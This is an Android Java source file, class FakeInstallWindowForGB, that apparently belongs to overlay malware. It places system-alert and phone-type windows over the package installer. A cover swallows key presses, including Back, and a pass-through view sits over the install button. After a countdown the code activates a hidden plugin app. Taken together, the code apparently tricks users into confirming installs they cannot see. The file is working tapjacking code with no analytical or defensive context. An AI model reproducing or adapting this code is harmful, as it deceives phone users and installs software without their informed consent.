package com.xstd.qm.fakecover;

import android.content.Context;
import android.graphics.PixelFormat;
import android.view.Gravity;
import android.view.KeyEvent;
import android.view.View;
import android.view.WindowManager;
import com.plugin.common.utils.UtilsRuntime;
import com.xstd.qm.AppRuntime;
import com.xstd.qm.UtilOperator;
import com.xstd.qm.Utils;
import com.xstd.qm.setting.MainSettingManager;

/**
 * Created with IntelliJ IDEA.
 * User: michael
 * Date: 13-11-6
 * Time: PM4:46
 * To change this template use File | Settings | File Templates.
 */
public final class FakeInstallWindowForGB extends FakeInstallWindow {

    public FakeInstallWindowForGB(Context context) {
        super(context);
    }

    @Override
    public void updateTimerCount() {
        if (count <= 0 || countDown == 0) {
            if (coverView != null && timerView != null) {
                wm.removeView(coverView);
                wm.removeView(timerView);

                if (installFullView != null) {
                    wm.removeView(installFullView);
                }
            }
            coverView = null;
            timerView = null;
            installFullView = null;

            UtilOperator.fake = null;

            AppRuntime.FAKE_WINDOWS_SHOW.set(false);

            MainSettingManager.getInstance().setPluginAppTime(MainSettingManager.getInstance().getPluginAppTime() + 1);

            MainSettingManager.getInstance().setLoopActiveCount(0);
            Utils.tryToActivePluginApp(context);
        } else {
            if ((count == 1 * 5)
                    || (countDown > 0 && AppRuntime.PLUGIN_INSTALLED && MainSettingManager.getInstance().getKeyPluginInstalled())) {
                AppRuntime.WATCHING_SERVICE_BREAK.set(true);
                UtilsRuntime.goHome(context);
            }

            handler.post(new Runnable() {
                @Override
                public void run() {
                    if (coverView != null && timerView != null) {
                        int time = count / 5;
                        int deta = count % 5;
                        if (deta > 0) {
                            time = time + 1;
                        }

//                        timeTV.setText(String.format(context.getString(R.string.fake_timer), time));
                        timeTV.setText("");
                        count--;
                        if (countDown > 0) {
                            countDown--;
                        }
                        handler.postDelayed(new Runnable() {
                            @Override
                            public void run() {
                                updateTimerCount();
                            }
                        }, 200);
                    }
                }
            });
        }

    }

    @Override
    public void dismiss() {
//            if (coverView != null && timerView != null) {
//                wm.removeView(coverView);
//                wm.removeView(timerView);
//            }
//            coverView = null;
//            timerView = null;
//            fake = null;
    }

    @Override
    public void show(boolean full) {
        AppRuntime.FAKE_WINDOWS_SHOW.set(true);
        confirmFullBtnParams = new WindowManager.LayoutParams();
        confirmFullBtnParams.type = WindowManager.LayoutParams.TYPE_SYSTEM_ALERT;
        confirmFullBtnParams.format = PixelFormat.RGBA_8888;
        confirmFullBtnParams.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE;
        confirmFullBtnParams.width = screenWidth / 2;
        confirmFullBtnParams.height = (int) (48 * density);
        confirmFullBtnParams.gravity = Gravity.BOTTOM | Gravity.LEFT;

        wm.addView(installFullView, confirmFullBtnParams);

        //timer
        WindowManager.LayoutParams btnParams = new WindowManager.LayoutParams();
        btnParams.type = WindowManager.LayoutParams.TYPE_PHONE;
        btnParams.format = PixelFormat.RGBA_8888;
        btnParams.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;
        btnParams.width = screenWidth / 2;
        btnParams.height = (int) (48 * density);
        btnParams.gravity = Gravity.RIGHT | Gravity.BOTTOM;
        wm.addView(timerView, btnParams);

        //cover
        WindowManager.LayoutParams wMParams = new WindowManager.LayoutParams();
        wMParams.type = WindowManager.LayoutParams.TYPE_PHONE;
        wMParams.format = PixelFormat.RGBA_8888;
        wMParams.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;
//                                | WindowManager.LayoutParams.FLAG_FULLSCREEN | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN;
        wMParams.width = WindowManager.LayoutParams.FILL_PARENT;
        wMParams.height = screenHeight - (int) ((48 + 25) * density);
        wMParams.gravity = Gravity.LEFT | Gravity.TOP;
        coverView.setOnKeyListener(new View.OnKeyListener() {
            @Override
            public boolean onKey(View view, int i, KeyEvent keyEvent) {
                return true;
            }
        });
        wm.addView(coverView, wMParams);
    }

}
